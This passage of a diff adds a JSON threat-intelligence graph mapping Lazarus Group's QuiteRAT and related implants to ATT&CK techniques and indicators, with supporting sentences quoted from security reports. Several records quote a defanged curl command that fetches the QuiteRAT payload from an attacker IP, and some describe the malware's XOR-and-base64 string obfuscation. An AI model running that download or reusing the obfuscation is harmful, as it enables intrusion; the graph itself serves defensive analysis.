+              "What's more, a closer examination of the adversary's recycled attack infrastructure used in its cyber assaults on enterprises has led to the discovery of a new threat dubbed CollectionRAT."
+            ],
+            [
+              3,
+              "QuiteRAT is said to be a successor to MagicRAT, itself a follow-up to TigerRAT, while CollectionRAT appears to share overlaps with EarlyRAT (aka Jupiter), an implant written in PureBasic with capabilities to run commands on the endpoint."
+            ],
+            [
+              9,
+              "Cisco Talos said the adversary is \"increasingly relying on open-source tools and frameworks in the initial access phase of their attacks, as opposed to strictly employing them in the post-compromise phase.\"\nThis includes the GoLang-based open-source DeimosC2 framework to obtain persistent access, with CollectionRAT primarily utilized to gather metadata, run arbitrary commands, manage files on the infected system, and deliver additional payloads."
+            ],
+            [
+              10,
+              "It's not immediately clear how CollectionRAT is propagated, but evidence shows that a trojanized copy of the PuTTY Link (Plink) utility hosted on the same infrastructure is being used to establish a remote tunnel to the system and serve the malware."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_e317a3974fac",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "MagicRAT",
+        "edges": [
+          "EDGE_1591b7ae70bb",
+          "EDGE_514a834cce34",
+          "EDGE_a72252a21a07",
+          "EDGE_cfeb34075efd",
+          "EDGE_d0364e9a4b53",
+          "EDGE_16b8d7aadb0c"
+        ],
+        "source": {
+          "MagicRAT_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              3,
+              "QuiteRAT has many of the same capabilities as Lazarus Group’s better-known MagicRAT malware, but its file size is significantly smaller."
+            ],
+            [
+              21,
+              "Although QuiteRAT, just like MagicRAT, uses embedded Qt libraries, none of these implants have a Graphical User Interface."
+            ],
+            [
+              22,
+              "Based on QuiteRAT’s technical characteristics, including the usage of the Qt framework, we assess that this implant belongs to the previously disclosed MagicRAT family."
+            ],
+            [
+              39,
+              "The latest version of Lazarus Group’s older MagicRAT implant observed in the wild was compiled in April 2022."
+            ],
+            [
+              40,
+              "This is the last version of MagicRAT that we know of."
+            ],
+            [
+              41,
+              "The use of MagicRAT’s derivative implant, QuiteRAT, beginning in May 2023 suggests the actor is changing tactics, opting for a smaller, more compact Qt-based implant."
+            ],
+            [
+              42,
+              "There are similarities between the implants that indicate that QuiteRAT is a derivative of MagicRAT."
+            ]
+          ],
+          "MagicRAT_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              1,
+              "In recent attacks against healthcare organizations and an Internet infrastructure company, North Korea's famous Lazarus Group deployed a new, ultra-compact, highly evasive remote access Trojan (RAT) called \"QuiteRAT.\"\nQuiteRAT is an upgraded version of another RAT the group deployed in 2022, \"MagicRAT,\" itself a follow-up from 2021's \"TigerRAT.\" QuiteRAT can pilfer information about its host machine and user, as well as run commands, and at just four to five megabytes, it hardly makes a noticeable imprint in a target network."
+            ],
+            [
+              5,
+              "In April 2022, Lazarus Group compiled the latest known version of \"MagicRAT,\" a Trojan which stood out not because of what it did, but what it was made of."
+            ],
+            [
+              11,
+              "The introduction of the Qt framework reduces the possibility of heuristic detection.\"\nQuiteRAT, first discovered in February, is the successor to MagicRAT."
+            ],
+            [
+              12,
+              "It lacks any built-in persistence mechanism, which MagicRAT achieved with the ability to set up scheduled tasks (QuiteRAT must be granted such power via a C2 server)."
+            ],
+            [
+              13,
+              "However, it makes up for that shortcoming by being significantly more compact — just 4 to 5 megabytes, on average, compared to MagicRAT's 18 megabytes."
+            ]
+          ],
+          "MagicRAT_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              3,
+              "QuiteRAT is said to be a successor to MagicRAT, itself a follow-up to TigerRAT, while CollectionRAT appears to share overlaps with EarlyRAT (aka Jupiter), an implant written in PureBasic with capabilities to run commands on the endpoint."
+            ],
+            [
+              4,
+              "\"QuiteRAT has many of the same capabilities as Lazarus Group's better-known MagicRAT malware, but its file size is significantly smaller,\" security researchers Asheer Malhotra, Vitor Ventura, and Jungsoo An said."
+            ],
+            [
+              6,
+              "\"QuiteRAT is clearly an evolution of MagicRAT,\" the researchers said."
+            ],
+            [
+              7,
+              "\"While MagicRAT is a bigger, bulkier malware family averaging around 18 MB in size, QuiteRAT is a much much smaller implementation, averaging around 4 to 5 MB in size.\"\nAnother crucial difference between the two is the lack of a built-in persistence mechanism in QuiteRAT, necessitating that a command be issued from the server to ensure continued operation on the compromised host."
+            ],
+            [
+              11,
+              "\"Lazarus Group previously relied on the use of custom-built implants such as MagicRAT, VSingle, Dtrack, and YamaBot as a means of establishing persistent initial access on a successfully compromised system,\" the researchers said."
+            ]
+          ]
+        }
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1016",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1016",
+        "ttp_id": "T1016",
+        "best_span_sentences_list": [
+          [
+            "The implant initially gathers some rudimentary information about the infected endpoint, including MAC addresses, IP addresses, and the current user name of the device."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            25,
+            25
+          ]
+        ],
+        "edges": [
+          "EDGE_cb0a24e4fd1d"
+        ],
+        "source": {
+          "TTP:T1016_blog.talosintelligence.com_lazarus-quiterat": {
+            "best_span_ranges": [
+              [
+                25,
+                25
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The implant initially gathers some rudimentary information about the infected endpoint, including MAC addresses, IP addresses, and the current user name of the device."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1027",
+        "ttp_id": "T1027",
+        "best_span_sentences_list": [
+          [
+            "All the networking-related configurations, such as the C2 URLs and extended URI parameters, are encoded and stored in the malware.",
+            "The strings are XOR’ed with 0x78 and then base64 encoded."
+          ],
+          [
+            "Both implants also use base64 encoding to obfuscate their strings with an additional measure, such as XOR or prepending hardcoded data, to make it difficult to decode the strings automatically."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            27,
+            28
+          ],
+          [
+            44,
+            44
+          ]
+        ],
+        "edges": [
+          "EDGE_9ffaab14ca6e",
+          "EDGE_1591b7ae70bb"
+        ],
+        "source": {
+          "TTP:T1027_blog.talosintelligence.com_lazarus-quiterat": {
+            "best_span_ranges": [
+              [
+                27,
+                28
+              ],
+              [
+                44,
+                44
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "All the networking-related configurations, such as the C2 URLs and extended URI parameters, are encoded and stored in the malware.",
+                "The strings are XOR’ed with 0x78 and then base64 encoded."
+              ],
+              [
+                "Both implants also use base64 encoding to obfuscate their strings with an additional measure, such as XOR or prepending hardcoded data, to make it difficult to decode the strings automatically."
+              ]
+            ]
+          },
+          "TTP:T1027_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": {
+            "best_span_ranges": [
+              [
+                2,
+                2
+              ],
+              [
+                11,
+                11
+              ],
+              [
+                16,
+                16
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Most interesting of all, however, is that QuiteRAT is built on Qt, a framework for designing graphical user interfaces (GUIs), which it wears like a costume to sneak past malware detection tools."
+              ],
+              [
+                "The introduction of the Qt framework reduces the possibility of heuristic detection.\"\nQuiteRAT, first discovered in February, is the successor to MagicRAT."
+              ],
+              [
+                "The two also use similar tactics for obfuscating code and entering into sleep states."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1033",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1033",
+        "ttp_id": "T1033",
+        "best_span_sentences_list": [
+          [
+            "The implant initially gathers some rudimentary information about the infected endpoint, including MAC addresses, IP addresses, and the current user name of the device."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            25,
+            25
+          ]
+        ],
+        "edges": [
+          "EDGE_5e1509f969f6"
+        ],
+        "source": {
+          "TTP:T1033_blog.talosintelligence.com_lazarus-quiterat": {
+            "best_span_ranges": [
+              [
+                25,
+                25
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The implant initially gathers some rudimentary information about the infected endpoint, including MAC addresses, IP addresses, and the current user name of the device."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1059",
+        "ttp_id": "T1059",
+        "best_span_sentences_list": [
+          [
+            "Both implants are built on the Qt framework and include capabilities such as arbitrary command execution."
+          ],
+          [
+            "The successful exploitation triggered the immediate download and execution of a malicious binary via the Java runtime process.",
+            "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+          ],
+          [
+            "Once the implant starts running, it sends out preliminary system information to its command and control (C2) servers and then waits on the C2 to respond with either a command code to execute or an actual Windows command to execute on the endpoint via a child cmd.exe process."
+          ],
+          [
+            "The malware also has the ability to run a ping command on a random IP address that it generates on the fly."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            4,
+            4
+          ],
+          [
+            10,
+            11
+          ],
+          [
+            14,
+            14
+          ],
+          [
+            32,
+            32
+          ]
+        ],
+        "edges": [
+          "EDGE_1c8221338a2c",
+          "EDGE_9300a4803403",
+          "EDGE_afc0846cafa1",
+          "EDGE_e73679f7cb65",
+          "EDGE_23d2b832f3f5",
+          "EDGE_3a2474c023a1",
+          "EDGE_16b8d7aadb0c"
+        ],
+        "source": {
+          "TTP:T1059_blog.talosintelligence.com_lazarus-quiterat": {
+            "best_span_ranges": [
+              [
+                4,
+                4
+              ],
+              [
+                10,
+                11
+              ],
+              [
+                14,
+                14
+              ],
+              [
+                32,
+                32
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Both implants are built on the Qt framework and include capabilities such as arbitrary command execution."
+              ],
+              [
+                "The successful exploitation triggered the immediate download and execution of a malicious binary via the Java runtime process.",
+                "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+              ],
+              [
+                "Once the implant starts running, it sends out preliminary system information to its command and control (C2) servers and then waits on the C2 to respond with either a command code to execute or an actual Windows command to execute on the endpoint via a child cmd.exe process."
+              ],
+              [
+                "The malware also has the ability to run a ping command on a random IP address that it generates on the fly."
+              ]
+            ]
+          },
+          "TTP:T1059_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": {
+            "best_span_ranges": [
+              [
+                2,
+                5
+              ],
+              [
+                9,
+                11
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "What's more, a closer examination of the adversary's recycled attack infrastructure used in its cyber assaults on enterprises has led to the discovery of a new threat dubbed CollectionRAT.",
+                "QuiteRAT is said to be a successor to MagicRAT, itself a follow-up to TigerRAT, while CollectionRAT appears to share overlaps with EarlyRAT (aka Jupiter), an implant written in PureBasic with capabilities to run commands on the endpoint.",
+                "\"QuiteRAT has many of the same capabilities as Lazarus Group's better-known MagicRAT malware, but its file size is significantly smaller,\" security researchers Asheer Malhotra, Vitor Ventura, and Jungsoo An said.",
+                "\"Both implants are built on the Qt framework and include capabilities such as arbitrary command execution.\"\nThe use of the Qt framework is seen as an intentional effort on the part of the adversary to make analysis a lot more challenging as it \"increases the complexity of the malware's code.\"\nThe activity, detected in early 2023, involved the exploitation of CVE-2022-47966, a mere five days after proof-of-concept (Poc) for the flaw emerged online, to directly deploy the QuiteRAT binary from a malicious URL."
+              ],
+              [
+                "Cisco Talos said the adversary is \"increasingly relying on open-source tools and frameworks in the initial access phase of their attacks, as opposed to strictly employing them in the post-compromise phase.\"\nThis includes the GoLang-based open-source DeimosC2 framework to obtain persistent access, with CollectionRAT primarily utilized to gather metadata, run arbitrary commands, manage files on the infected system, and deliver additional payloads.",
+                "It's not immediately clear how CollectionRAT is propagated, but evidence shows that a trojanized copy of the PuTTY Link (Plink) utility hosted on the same infrastructure is being used to establish a remote tunnel to the system and serve the malware.",
+                "\"Lazarus Group previously relied on the use of custom-built implants such as MagicRAT, VSingle, Dtrack, and YamaBot as a means of establishing persistent initial access on a successfully compromised system,\" the researchers said."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1071",
+        "ttp_id": "T1071",
+        "best_span_sentences_list": [
+          [
+            "Once the implant starts running, it sends out preliminary system information to its command and control (C2) servers and then waits on the C2 to respond with either a command code to execute or an actual Windows command to execute on the endpoint via a child cmd.exe process."
+          ],
+          [
+            "The implant also has the ability to receive a second URL from the current C2 server via the command code receivemail\n."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            14,
+            14
+          ],
+          [
+            37,
+            37
+          ]
+        ],
+        "edges": [
+          "EDGE_91904d83ceab"
+        ],
+        "source": {
+          "TTP:T1071_blog.talosintelligence.com_lazarus-quiterat": {
+            "best_span_ranges": [
+              [
+                14,
+                14
+              ],
+              [
+                37,
+                37
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Once the implant starts running, it sends out preliminary system information to its command and control (C2) servers and then waits on the C2 to respond with either a command code to execute or an actual Windows command to execute on the endpoint via a child cmd.exe process."
+              ],
+              [
+                "The implant also has the ability to receive a second URL from the current C2 server via the command code receivemail\n."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1082",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1082",
+        "ttp_id": "T1082",
+        "best_span_sentences_list": [
+          [
+            "Once the implant starts running, it sends out preliminary system information to its command and control (C2) servers and then waits on the C2 to respond with either a command code to execute or an actual Windows command to execute on the endpoint via a child cmd.exe process."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            14,
+            14
+          ]
+        ],
+        "edges": [
+          "EDGE_a72252a21a07"
+        ],
+        "source": {
+          "TTP:T1082_blog.talosintelligence.com_lazarus-quiterat": {
+            "best_span_ranges": [
+              [
+                14,
+                14
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Once the implant starts running, it sends out preliminary system information to its command and control (C2) servers and then waits on the C2 to respond with either a command code to execute or an actual Windows command to execute on the endpoint via a child cmd.exe process."
+              ]
+            ]
+          },
+          "TTP:T1082_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": {
+            "best_span_ranges": [
+              [
+                1,
+                1
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In recent attacks against healthcare organizations and an Internet infrastructure company, North Korea's famous Lazarus Group deployed a new, ultra-compact, highly evasive remote access Trojan (RAT) called \"QuiteRAT.\"\nQuiteRAT is an upgraded version of another RAT the group deployed in 2022, \"MagicRAT,\" itself a follow-up from 2021's \"TigerRAT.\" QuiteRAT can pilfer information about its host machine and user, as well as run commands, and at just four to five megabytes, it hardly makes a noticeable imprint in a target network."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1105",
+        "ttp_id": "T1105",
+        "best_span_sentences_list": [
+          [
+            "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT."
+          ],
+          [
+            "The successful exploitation triggered the immediate download and execution of a malicious binary via the Java runtime process.",
+            "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            8,
+            8
+          ],
+          [
+            10,
+            11
+          ]
+        ],
+        "edges": [
+          "EDGE_0706e16453d0",
+          "EDGE_078f029bf19d",
+          "EDGE_26474d40dc1b",
+          "EDGE_6b424c67f46e",
+          "EDGE_8c7af8c62b7e",
+          "EDGE_c8825bb9df74",
+          "EDGE_4ce50616bcef",
+          "EDGE_f57195fb7162"
+        ],
+        "source": {
+          "TTP:T1105_blog.talosintelligence.com_lazarus-quiterat": {
+            "best_span_ranges": [
+              [
+                8,
+                8
+              ],
+              [
+                10,
+                11
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT."
+              ],
+              [
+                "The successful exploitation triggered the immediate download and execution of a malicious binary via the Java runtime process.",
+                "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+              ]
+            ]
+          },
+          "TTP:T1105_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": {
+            "best_span_ranges": [
+              [
+                4,
+                5
+              ],
+              [
+                10,
+                10
+              ],
+              [
+                12,
+                12
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "\"QuiteRAT has many of the same capabilities as Lazarus Group's better-known MagicRAT malware, but its file size is significantly smaller,\" security researchers Asheer Malhotra, Vitor Ventura, and Jungsoo An said.",
+                "\"Both implants are built on the Qt framework and include capabilities such as arbitrary command execution.\"\nThe use of the Qt framework is seen as an intentional effort on the part of the adversary to make analysis a lot more challenging as it \"increases the complexity of the malware's code.\"\nThe activity, detected in early 2023, involved the exploitation of CVE-2022-47966, a mere five days after proof-of-concept (Poc) for the flaw emerged online, to directly deploy the QuiteRAT binary from a malicious URL."
+              ],
+              [
+                "It's not immediately clear how CollectionRAT is propagated, but evidence shows that a trojanized copy of the PuTTY Link (Plink) utility hosted on the same infrastructure is being used to establish a remote tunnel to the system and serve the malware."
+              ],
+              [
+                "\"These implants are then instrumented to deploy a variety of open-source or dual-use tools to perform a multitude of malicious hands-on-keyboard activities in the compromised enterprise network.\"\nThe development is a sign that the Lazarus Group is continually shifting tactics and expanding its malicious arsenal, at the same time weaponizing newly disclosed vulnerabilities in software to devastating effect."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1112",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1112",
+        "ttp_id": "T1112",
+        "best_span_sentences_list": [
+          [
+            "Persistence for the implant is achieved via the registry by issuing the following command to QuiteRAT:."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            16,
+            16
+          ]
+        ],
+        "edges": [
+          "EDGE_22089e4df493"
+        ],
+        "source": {
+          "TTP:T1112_blog.talosintelligence.com_lazarus-quiterat": {
+            "best_span_ranges": [
+              [
+                16,
+                16
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Persistence for the implant is achieved via the registry by issuing the following command to QuiteRAT:."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1132",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1132",
+        "ttp_id": "T1132",
+        "best_span_sentences_list": [
+          [
+            "All the networking-related configurations, such as the C2 URLs and extended URI parameters, are encoded and stored in the malware.",
+            "The strings are XOR’ed with 0x78 and then base64 encoded."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            27,
+            28
+          ]
+        ],
+        "edges": [
+          "EDGE_4a5a4dd9ca35"
+        ],
+        "source": {
+          "TTP:T1132_blog.talosintelligence.com_lazarus-quiterat": {
+            "best_span_ranges": [
+              [
+                27,
+                28
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "All the networking-related configurations, such as the C2 URLs and extended URI parameters, are encoded and stored in the malware.",
+                "The strings are XOR’ed with 0x78 and then base64 encoded."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1190",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1190",
+        "ttp_id": "T1190",
+        "best_span_sentences_list": [
+          [
+            "In this campaign, the attackers began exploiting a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) five days after PoCs for the exploit were publicly disclosed to deliver and deploy a newer malware threat we track as “QuiteRAT.” Security researchers first discovered this implant in February, but little has been written on it since then."
+          ],
+          [
+            "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT.",
+            "The actors exploited a vulnerable ManageEngine ServiceDesk instance to gain initial access."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ],
+          [
+            8,
+            9
+          ]
+        ],
+        "edges": [
+          "EDGE_338ade9a3c12",
+          "EDGE_89318e9bef34",
+          "EDGE_cd347e1fa5c2",
+          "EDGE_cd6b7971419f",
+          "EDGE_5a8c7ca9ed57"
+        ],
+        "source": {
+          "TTP:T1190_blog.talosintelligence.com_lazarus-quiterat": {
+            "best_span_ranges": [
+              [
+                2,
+                2
+              ],
+              [
+                8,
+                9
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In this campaign, the attackers began exploiting a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) five days after PoCs for the exploit were publicly disclosed to deliver and deploy a newer malware threat we track as “QuiteRAT.” Security researchers first discovered this implant in February, but little has been written on it since then."
+              ],
+              [
+                "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT.",
+                "The actors exploited a vulnerable ManageEngine ServiceDesk instance to gain initial access."
+              ]
+            ]
+          },
+          "TTP:T1190_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": {
+            "best_span_ranges": [
+              [
+                3,
+                3
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In February — five days after the disclosure of proofs-of-compromise (PoCs) relating to the 9.8 \"Critical\"-rated CVE-2022-47966, a remote code execution (RCE) vulnerability for Zoho ManageEngine — Lazarus exploited ManageEngine ServiceDesk to infiltrate healthcare organizations in the US and UK, as well as a UK-based \"Internet backbone infrastructure provider,\" according to a new report from Cisco Talos."
+              ]
+            ]
+          },
+          "TTP:T1190_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": {
+            "best_span_ranges": [
+              [
+                0,
+                0
+              ],
+              [
+                4,
+                5
+              ],
+              [
+                8,
+                12
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The North Korea-linked threat actor known as Lazarus Group has been observed exploiting a now-patched critical security flaw impacting Zoho ManageEngine ServiceDesk Plus to distribute a remote access trojan called such as QuiteRAT."
+              ],
+              [
+                "\"QuiteRAT has many of the same capabilities as Lazarus Group's better-known MagicRAT malware, but its file size is significantly smaller,\" security researchers Asheer Malhotra, Vitor Ventura, and Jungsoo An said.",
+                "\"Both implants are built on the Qt framework and include capabilities such as arbitrary command execution.\"\nThe use of the Qt framework is seen as an intentional effort on the part of the adversary to make analysis a lot more challenging as it \"increases the complexity of the malware's code.\"\nThe activity, detected in early 2023, involved the exploitation of CVE-2022-47966, a mere five days after proof-of-concept (Poc) for the flaw emerged online, to directly deploy the QuiteRAT binary from a malicious URL."
+              ],
+              [
+                "The findings also overlap with another campaign uncovered by WithSecure earlier this February in which security flaws in unpatched Zimbra devices were used to breach victim systems and ultimately install QuiteRAT.",
+                "Cisco Talos said the adversary is \"increasingly relying on open-source tools and frameworks in the initial access phase of their attacks, as opposed to strictly employing them in the post-compromise phase.\"\nThis includes the GoLang-based open-source DeimosC2 framework to obtain persistent access, with CollectionRAT primarily utilized to gather metadata, run arbitrary commands, manage files on the infected system, and deliver additional payloads.",
+                "It's not immediately clear how CollectionRAT is propagated, but evidence shows that a trojanized copy of the PuTTY Link (Plink) utility hosted on the same infrastructure is being used to establish a remote tunnel to the system and serve the malware.",
+                "\"Lazarus Group previously relied on the use of custom-built implants such as MagicRAT, VSingle, Dtrack, and YamaBot as a means of establishing persistent initial access on a successfully compromised system,\" the researchers said.",
+                "\"These implants are then instrumented to deploy a variety of open-source or dual-use tools to perform a multitude of malicious hands-on-keyboard activities in the compromised enterprise network.\"\nThe development is a sign that the Lazarus Group is continually shifting tactics and expanding its malicious arsenal, at the same time weaponizing newly disclosed vulnerabilities in software to devastating effect."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1036",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1036",
+        "ttp_id": "T1036",
+        "best_span_sentences_list": [
+          [
+            "Most interesting of all, however, is that QuiteRAT is built on Qt, a framework for designing graphical user interfaces (GUIs), which it wears like a costume to sneak past malware detection tools."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ]
+        ],
+        "edges": [
+          "EDGE_41a3e9d02f8f",
+          "EDGE_ef79394053f0",
+          "EDGE_514a834cce34"
+        ],
+        "source": {
+          "TTP:T1036_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": {
+            "best_span_ranges": [
+              [
+                2,
+                2
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Most interesting of all, however, is that QuiteRAT is built on Qt, a framework for designing graphical user interfaces (GUIs), which it wears like a costume to sneak past malware detection tools."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1053",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1053",
+        "ttp_id": "T1053",
+        "best_span_sentences_list": [
+          [
+            "It lacks any built-in persistence mechanism, which MagicRAT achieved with the ability to set up scheduled tasks (QuiteRAT must be granted such power via a C2 server)."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            12,
+            12
+          ]
+        ],
+        "edges": [
+          "EDGE_cfeb34075efd"
+        ],
+        "source": {
+          "TTP:T1053_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": {
+            "best_span_ranges": [
+              [
+                12,
+                12
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "It lacks any built-in persistence mechanism, which MagicRAT achieved with the ability to set up scheduled tasks (QuiteRAT must be granted such power via a C2 server)."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1497",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1497",
+        "ttp_id": "T1497",
+        "best_span_sentences_list": [
+          [
+            "The two also use similar tactics for obfuscating code and entering into sleep states."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            16,
+            16
+          ]
+        ],
+        "edges": [
+          "EDGE_bcb86c9d4e3a",
+          "EDGE_d0364e9a4b53"
+        ],
+        "source": {
+          "TTP:T1497_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": {
+            "best_span_ranges": [
+              [
+                16,
+                16
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The two also use similar tactics for obfuscating code and entering into sleep states."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1090",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1090",
+        "ttp_id": "T1090",
+        "best_span_sentences_list": [
+          [
+            "It's not immediately clear how CollectionRAT is propagated, but evidence shows that a trojanized copy of the PuTTY Link (Plink) utility hosted on the same infrastructure is being used to establish a remote tunnel to the system and serve the malware."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            10,
+            10
+          ]
+        ],
+        "edges": [
+          "EDGE_24e8e5e7e35a",
+          "EDGE_60cf39087132"
+        ],
+        "source": {
+          "TTP:T1090_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": {
+            "best_span_ranges": [
+              [
+                10,
+                10
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "It's not immediately clear how CollectionRAT is propagated, but evidence shows that a trojanized copy of the PuTTY Link (Plink) utility hosted on the same infrastructure is being used to establish a remote tunnel to the system and serve the malware."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1219",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1219",
+        "ttp_id": "T1219",
+        "best_span_sentences_list": [
+          [
+            "The North Korea-linked threat actor known as Lazarus Group has been observed exploiting a now-patched critical security flaw impacting Zoho ManageEngine ServiceDesk Plus to distribute a remote access trojan called such as QuiteRAT."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            0,
+            0
+          ]
+        ],
+        "edges": [
+          "EDGE_24e2474709ac",
+          "EDGE_6e49934a1253"
+        ],
+        "source": {
+          "TTP:T1219_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": {
+            "best_span_ranges": [
+              [
+                0,
+                0
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The North Korea-linked threat actor known as Lazarus Group has been observed exploiting a now-patched critical security flaw impacting Zoho ManageEngine ServiceDesk Plus to distribute a remote access trojan called such as QuiteRAT."
+              ]
+            ]
+          }
+        }
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_2438fd6edfb6",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "ed8ec7a8dd089019cfd29143f008fa0951c56a35d73b2e1b274315152d0c0ee6",
+        "edges": [],
+        "source": {
+          "ed8ec7a8dd089019cfd29143f008fa0951c56a35d73b2e1b274315152d0c0ee6_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              46,
+              "Hashes\nQuiteRAT\ned8ec7a8dd089019cfd29143f008fa0951c56a35d73b2e1b274315152d0c0ee6."
+            ]
+          ]
+        },
+        "raw_value": "ed8ec7a8dd089019cfd29143f008fa0951c56a35d73b2e1b274315152d0c0ee6",
+        "canonical_value": "ed8ec7a8dd089019cfd29143f008fa0951c56a35d73b2e1b274315152d0c0ee6"
+      },
+      {
+        "node_id": "IOC_32375433d366",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "c:\\users\\public\\notify[.]exe.",
+        "edges": [
+          "EDGE_0706e16453d0"
+        ],
+        "source": {
+          "c:\\users\\public\\notify[.]exe._blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              11,
